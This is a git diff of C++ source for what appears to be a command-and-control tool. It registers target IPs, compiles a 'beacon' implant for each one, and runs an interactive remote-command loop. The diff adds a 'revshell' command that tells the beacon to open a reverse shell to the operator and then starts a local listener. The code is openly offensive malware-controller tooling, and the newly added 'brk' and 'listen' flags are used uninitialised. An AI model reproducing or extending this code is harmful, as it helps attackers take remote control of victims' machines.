@@ -16,17 +16,10 @@ void log(std::string log){
     std::cout << log << std::endl;
 }
 
-void exitprog(ARGS) {
-    std::cout << "removing .runtime\n";
-    const int result = remove(".runtime");
-    if (result == 0){
-        std::cout << "success\n";
-    }
-    else {
-        std::cout << "failed to remove .runtime, quitting anyway\n";
-    }
+int exitprog(ARGS) {
     std::cout << "Goodbye\n";
     exit(0);
+    return 0;
 }
 
 bool validIPAddress(const std::string &IP) {
@@ -35,43 +28,17 @@ bool validIPAddress(const std::string &IP) {
     return result != 0;
 }
 
-std::string getconfigname(){
-    std::ifstream runtime(".runtime");
-    std::string projectname{};
-    std::string fname;
-    while (runtime >> projectname){
-        fname = "config/" + projectname + ".json";
-    }
-    runtime.close();
-    return fname;
-}
-
-json getConfig() {
-    std::string fname = getconfigname();
-    json config;
-    std::ifstream configfile(fname);
-    configfile >> config;
-    configfile.close();
-    return config;
-}
-
-void setConfig(json &config){
-    std::ofstream o(getconfigname());
-    o << std::setw(4) << config << std::endl;
-    o.close();
-}
-
-void add_target(ARGS args) {
+int add_target(ARGS args) {
     if (args.size() != 2) {
         usage_err("add-target");
-        return;
+        return 1;
     }
     log("Validating parameters...");
     if (!validIPAddress(args[1])){
         std::cerr << "error: IP address is invalid";
-        return;
+        return 1;
     }
-    json config = getConfig();
+    json config = *getConfig();
     json target = json({});
     log("creating entry...");
     target["id"] = config["targets"].size();
@@ -81,6 +48,7 @@ void add_target(ARGS args) {
     config["targets"].push_back(target);
     setConfig(config);
     log("success");
+    return 0;
 }
 
 bool validTarget(std::string tid, int maxtarget){
@@ -99,10 +67,10 @@ bool validTarget(std::string tid, int maxtarget){
     return true;
 }
 
-void new_beacon(ARGS args){
+int new_beacon(ARGS args){
     if (args.size() != 2) {
         usage_err("new-beacon");
-        return;
+        return 1;
     }
     int port{};
     try {
@@ -110,9 +78,9 @@ void new_beacon(ARGS args){
     }
     catch (...) {
         std::cerr << "error: invalid port number\n";
-        return;
+        return 1;
     }
-    json config = getConfig();
+    json config = *getConfig();
     if (!validTarget(args[0], config["targets"].size())){
         usage_err("new-beacon");
     }
@@ -125,14 +93,15 @@ void new_beacon(ARGS args){
     };
     config["targets"][tid]["beacon"] = beacon;
     setConfig(config);
+    return 0;
 }
 
-void targets(ARGS args){
+int targets(ARGS args){
     if (args.size() != 0){
         usage_err("targets");
-        return;   
+        return 1;   
     }
-    json config = getConfig();
+    json config = *getConfig();
     for (auto &i : config["targets"]){
         std::stringstream ss;
         ss << "target " << i["id"] << ":";
@@ -141,22 +110,23 @@ void targets(ARGS args){
         << tgnum << std::setw(15) << std::left << std::string{i["name"]};
         std::cout << std::setw(15) << std::left << std::string{i["ip"]} << std::endl;
     }
+    return 0;
 }
 
-void info(ARGS args){
+int info(ARGS args){
     if (args.size() != 1){
         usage_err("target-info");
-        return;
+        return 1;
     }
-    json config = getConfig();
+    json config = *getConfig();
     if (!validTarget(args[0], config["targets"].size())){
         usage_err("target-info");
-        return;
+        return 1;
     }
     int id = std::stoi(args[0]);
     if (id+1 > config["targets"].size()){
         std::cerr << "error: target does not exist\n";
-        return;
+        return 1;
     }
     std::vector properties = { "id", "name", "ip", "uris", "beacon" };
     for ( auto &pt : properties) {
@@ -166,17 +136,18 @@ void info(ARGS args){
         std::cout << std::setw(15) << std::left << propUpper << ": "
         << std::setw(15) << std::left << config["targets"][id][prop] << std::endl;
     }
+    return 0;
 }
 
-void rm_target(ARGS args){
+int rm_target(ARGS args){
     if (args.size() != 1){
         usage_err("rm-target");
-        return;
+        return 1;
     }
-    json config = getConfig();
+    json config = *getConfig();
     if (!validTarget(args[0], config["targets"].size())){
         usage_err("rm-target");
-        return;
+        return 1;
     }
     int id = std::stoi(args[0]);
     json j = json::array();
@@ -195,17 +166,18 @@ void rm_target(ARGS args){
     config["targets"] = j;
     setConfig(config);
     log("success");
+    return 0;
 }
 
-void compile(ARGS args){
+int compile(ARGS args){
     if (args.size() != 2){
         usage_err("compile");
-        return;
+        return 1;
     }
-    json config = getConfig();
+    json config = *getConfig();
     if (!validTarget(args[0], config["targets"].size())){
         usage_err("compile");
-        return;
+        return 1;
     }
     std::string id = args[0];
     int id_int = std::stoi(id);
@@ -228,32 +200,90 @@ void compile(ARGS args){
 
     system("echo \"binary to be saved to $PWD/beacon\"");
     std::string compiler = args[1];
-    std::string cmdexec = compiler + " remote/*.cpp libs/*.cpp -I include/ -I remote/ -o $PWD/beacon -lreadline";
+    std::string cmdexec = compiler + " remote/*.cpp libs/*.cpp -I include/ -I remote/ -o $PWD/beacon -Wno-write-strings -lreadline";
     system(cmdexec.c_str());
     const int result = remove("remote/beacon.vars");
     if (result != 0)
         std::cout << "Failed to remove variable file (remote/beacon.vars)\n";
+    return 0;
 }
 
-void r_exec(ARGS args){
+std::vector<std::string> getoperation(std::string cmd){
+	std::vector<std::string> tokens;
+	std::string word;
+	for (std::string::size_type i = 0; i < cmd.size(); i++)
+	{
+		if (cmd[i] != ' ')
+		{
+			word = word + cmd[i];
+		}
+		else
+		{
+			tokens.push_back(word);
+			word = "";
+		}
+	}
+	tokens.push_back(word);
+	return tokens;
+}
+
+bool verifyRevShell(ARGS toks){
+    if (toks.size() != 2){
+        return false;
+    }
+    try {
+        std::stoi(toks[1]);
+    }
+    catch (...){
+        return false;
+    }
+    return std::stoi(toks[1]) < 65536;
+}
+
+std::string get_binary(std::string util){
+    json j;
+    std::string statement;
+    std::string nc_bin;
+    std::ifstream f("config/binaries.json");
+    f >> j;
+    return j[util];
+}
+
+int r_exec(ARGS args){
     if (args.size() != 1){
         usage_err("r-exec");
-        return;
+        return 1;
     }
-    json config = getConfig();
+    json config = *getConfig();
     if (!validTarget(args[0], config["targets"].size())){
         usage_err("r-exec");
-        return;
+        return 1;
     }
     json upd;
     std::string cmd;
     std::cout << "enter 'exit' to stop\n";
     std::string exit{"exit"};
+    std::string cout;
+    ARGS toks;
+    bool brk;
+    bool listen;
     while (true){
         std::cout << "[" << args[0] << " $] ";
         std::getline(std::cin, cmd);
         if (cmd == "exit"){
-            return;
+            return 0;
+        }
+        toks = getoperation(cmd);
+        if (toks[0] == "revshell"){
+            cout = "reverse shell should spawn in ~5 seconds\n";
+            brk = true;
+            listen = true;
+            if (!verifyRevShell(toks))
+            {
+                std::cout << "invalid usage of revshell\n";
+                std::cout << "revshell <LPORT>\n";
+                continue;
+            }
         }
         std::string k;
         upd["cmd"] = cmd;
@@ -261,5 +291,11 @@ void r_exec(ARGS args){
         ss << upd;
         k = ss.str();
         communicate(std::stoi(args[0]), k);
+        if (listen)
+            listener(toks[1]);
+        if (brk)
+            break;
     }
+    //Here only executes if a reverse shell was asked for
+    return 0;
 }
